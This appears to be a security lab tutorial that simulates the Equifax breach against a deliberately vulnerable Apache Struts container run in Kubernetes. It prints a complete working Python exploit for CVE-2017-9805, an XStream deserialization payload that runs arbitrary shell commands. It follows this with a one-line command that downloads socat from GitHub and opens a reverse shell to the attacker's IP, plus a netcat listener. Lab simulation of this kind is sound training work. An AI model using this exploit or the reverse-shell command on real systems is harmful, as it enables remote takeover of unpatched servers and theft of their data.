========================
Struts Attack - Equifax
========================

The goal of this article is to simulate the Equifax attack which was carried out exploiting Apache Struts vulnerability.

Apache Struts is an open-source framework used to build Java web applications. The vulnerability is a remote code execution bug that affects the Jakarta Multipart parser.

In this attack, the front end is exploited and a reverse shell is created in the machine where struts is running. The adversary can exploit that machine - escalate privileges, spawn and terminate processes, move laterally, and get to the crown jewels.

There are 2 parts to this setup

1) Setup a container running vulnerable Apache struts in Kubernetes
2) Attack the container, exploit the vulnerability and establish a command and control

.. image:: https://raw.githubusercontent.com/araalinetworks/attacks/main/images/strutssetup.png
 :width: 650
 :alt: ssrf setup


Running the Vulnerable container in Kubernetes
==============================================

**Container:** 

We have already created a container with a vulnerable Apache Struts app and its present at - quay.io/araalinetworks/struts:latest

Download the deployment yaml file - deployment.yaml

Apply this file in your Kubernetes cluster in a specific namespace

.. code-block:: RST

    $ kubectl create ns strutfrontend
    $ kubectl apply -f deployment.yaml -n strutfrontend

Check (1) if the pods are running, and (2) get the External IP of the exposed service

.. image:: https://raw.githubusercontent.com/araalinetworks/attacks/main/images/strutskubectlgetpodsvc.png
 :width: 650
 :alt: kubectl get pods

Now open a browser and check if the app is up and running, by logging into the external IP on port 8080
http://40.88.254.51:8080/super-app/orders/3

.. image:: https://raw.githubusercontent.com/araalinetworks/attacks/main/images/strutsfrontend.png
 :width: 650
 :alt: frond end of the app

If you see the screen above, Congratulations! we have completed the first part.


Setup a VM to attack the container
==================================

Make sure **python 3.6** is installed on the VM.

Open a vim editor and copy the python code below and save it as **attack42627.py** 

::
   
   
    # Exploit Title: Struts 2.5 - 2.5.12 REST Plugin XStream RCE
    # Google Dork: filetype:action
    # Date: 06/09/2017
    # Exploit Author: Warflop
    # Vendor Homepage: https://struts.apache.org/
    # Software Link: http://mirror.nbtelecom.com.br/apache/struts/2.5.10/struts-2.5.10-all.zip
    # Version: Struts 2.5 - Struts 2.5.12
    # Tested on: Struts 2.5.10
    # CVE : 2017-9805
    
    #!/usr/bin/env python3
    # coding=utf-8
    # *****************************************************
    # Struts CVE-2017-9805 Exploit
    # Warflop (http://securityattack.com.br/)
    # Greetz: Pimps & G4mbl3r
    # *****************************************************
    import requests
    import sys
    
    def exploration(command):
    
    	exploit = '''
    				<map>
    				<entry>
    				<jdk.nashorn.internal.objects.NativeString>
    				<flags>0</flags>
    				<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
    				<dataHandler>
    				<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
    				<is class="javax.crypto.CipherInputStream">
    				<cipher class="javax.crypto.NullCipher">
    				<initialized>false</initialized>
    				<opmode>0</opmode>
    				<serviceIterator class="javax.imageio.spi.FilterIterator">
    				<iter class="javax.imageio.spi.FilterIterator">
    				<iter class="java.util.Collections$EmptyIterator"/>
    				<next class="java.lang.ProcessBuilder">
    				<command>
    				<string>/bin/sh</string><string>-c</string><string>'''+ command +'''</string>
    				</command>
    				<redirectErrorStream>false</redirectErrorStream>
    				</next>
    				</iter>
    				<filter class="javax.imageio.ImageIO$ContainsFilter">
    				<method>
    				<class>java.lang.ProcessBuilder</class>
    				<name>start</name>
    				<parameter-types/>
    				</method>
    				<name>foo</name>
    				</filter>
    				<next class="string">foo</next>
    				</serviceIterator>
    				<lock/>
    				</cipher>
    				<input class="java.lang.ProcessBuilder$NullInputStream"/>
    				<ibuffer/>
    				<done>false</done>
    				<ostart>0</ostart>
    				<ofinish>0</ofinish>
    				<closed>false</closed>
    				</is>
    				<consumed>false</consumed>
    				</dataSource>
    				<transferFlavors/>
    				</dataHandler>
    				<dataLen>0</dataLen>
    				</value>
    				</jdk.nashorn.internal.objects.NativeString>
    				<jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
    				</entry>
    				<entry>
    				<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    				<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    				</entry>
    				</map>
    				'''
    
    
    	url = sys.argv[1]
    
    	headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0',
    			'Content-Type': 'application/xml'}
    
    	request = requests.post(url, data=exploit, headers=headers)
    	print (request.text)
    
    if len(sys.argv) < 3:
    	print ('CVE: 2017-9805 - Apache Struts2 Rest Plugin Xstream RCE')
    	print ('[*] Warflop - http://securityattack.com.br')
    	print ('[*] Greatz: Pimps & G4mbl3r')
    	print ('[*] Use: python struts2.py URL COMMAND')
    	print ('[*] Example: python struts2.py http://sitevulnerable.com/struts2-rest-showcase/orders/3 id')
    	exit(0)
    else:
    	exploration(sys.argv[2])



Now open two terminals, on one terminal type 

.. code-block:: RST
    
   $ sudo nc -nvlp 12345

Other terminal type

.. code-block:: XML

   $ python3 strutattack/attack42627.py http://40.88.254.51:8080/super-app/orders/3 'wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:"ash -li",pty,stderr,setsid,sigint,sane tcp:104.41.3.199:12345'    


Here, 40.88.254.51 is the IP of the struts app.

and 104.41.3.199:12345 is the IP of the machine from which you are carrying out the attack.
